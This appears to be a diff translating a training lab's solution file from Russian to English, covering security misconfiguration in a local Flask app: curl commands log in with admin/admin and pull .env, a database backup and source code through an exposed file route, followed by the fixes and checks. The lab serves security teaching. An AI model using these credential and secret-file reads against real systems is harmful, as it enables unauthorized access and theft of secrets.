@@ -1,58 +1,58 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A02 — Решение (спойлеры!)
+# A02 — Solution (spoilers!)
 
-Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.md).
+Try the lab yourself first, using the hints from the [README](./README.md).
 
-## Эксплуатация на vulnerable (порт 8011)
+## Exploitation on vulnerable (port 8011)
 
 ```bash
-# 1. Учётная запись по умолчанию
+# 1. Default account
 curl -H 'Content-Type: application/json' \
   -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8011/login
 # → FLAG{a02_default_credentials}
 
-# 2. Маршрут /files отдаёт любые файлы из папки приложения
+# 2. The /files route serves any file from the application folder
 curl http://127.0.0.1:8011/files/.env          # → FLAG{a02_exposed_env_file}
 curl http://127.0.0.1:8011/files/backup.sql    # → FLAG{a02_forgotten_backup}
-curl http://127.0.0.1:8011/files/app.py        # → исходный код
+curl http://127.0.0.1:8011/files/app.py        # → source code
 
-# 3. Подробная ошибка: трассировка и строка подключения к БД
+# 3. Verbose error: a stack trace and the database connection string
 curl "http://127.0.0.1:8011/items?id=abc"
 
-# 4. Заголовки
+# 4. Headers
 curl -i http://127.0.0.1:8011/
-# есть: X-Powered-By (версии Flask/Python)
-# нет:  X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy
+# present: X-Powered-By (Flask/Python versions)
+# missing: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy
 ```
 
-## В чём ошибки
+## What is wrong
 
-| № | Ошибка | Чем опасна |
-|---|--------|-----------|
-| 1 | Пароль `admin` / `admin` | Вход любому, кто знает типовые пары |
-| 2 | `/files/<имя>` отдаёт корень приложения | Утечка `.env`, бэкапов и исходного кода |
-| 3 | Обработчик ошибок показывает трассировку и конфигурацию | Раскрывает структуру приложения и секреты |
-| 4 | Нет защитных заголовков и есть баннер версий | Упрощает атаки (clickjacking, MIME sniffing) и разведку |
+| № | Mistake | Why it is dangerous |
+|---|---------|---------------------|
+| 1 | Password `admin` / `admin` | Anyone who knows the usual pairs can log in |
+| 2 | `/files/<name>` serves the application root | Leaks `.env`, backups and source code |
+| 3 | The error handler shows a stack trace and the configuration | Reveals the application structure and secrets |
+| 4 | No security headers and a version banner is present | Makes attacks (clickjacking, MIME sniffing) and reconnaissance easier |
 
-## Исправления (fixed, порт 8012)
+## Fixes (fixed, port 8012)
 
-- Пароль берётся из `ADMIN_PASSWORD`; если не задан, генерируется случайный
-- Маршрут `/files` удалён; наружу отдаётся только папка `static/`
-- Единый обработчик ошибок: пользователю нейтральный ответ с `error_id`, подробности только в лог
-- Заголовки `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy`, без `X-Powered-By`
-- Нечисловой `id` обрабатывается как обычная ошибка ввода (`400`), а не приводит к падению
+- The password comes from `ADMIN_PASSWORD`; if it is not set, a random one is generated
+- The `/files` route is removed; only the `static/` folder is served
+- A single error handler: the user gets a neutral response with an `error_id`, details go only to the log
+- The headers `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy` are set, and there is no `X-Powered-By`
+- A non-numeric `id` is handled as an ordinary input error (`400`) instead of crashing
 
-Проверка на fixed:
+Check on fixed:
 
 ```bash
 curl http://127.0.0.1:8012/files/.env           # 404
-curl "http://127.0.0.1:8012/items?id=abc"       # 400, без трассировки
-curl -i http://127.0.0.1:8012/                  # защитные заголовки на месте
+curl "http://127.0.0.1:8012/items?id=abc"       # 400, no stack trace
+curl -i http://127.0.0.1:8012/                  # security headers in place
 curl -H 'Content-Type: application/json' \
   -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8012/login   # 401
 ```
 
-## Что ещё стоит помнить
-- В реальных системах секреты не пишут в логи: в лабе пароль выводится в лог только для удобства.
-- Конфигурацию нужно проверять автоматически и при каждом выпуске, а не один раз.
+## What else to remember
+- In real systems secrets are not written to logs: in the lab the password is printed to the log only for convenience.
+- Configuration must be checked automatically and on every release, not once.
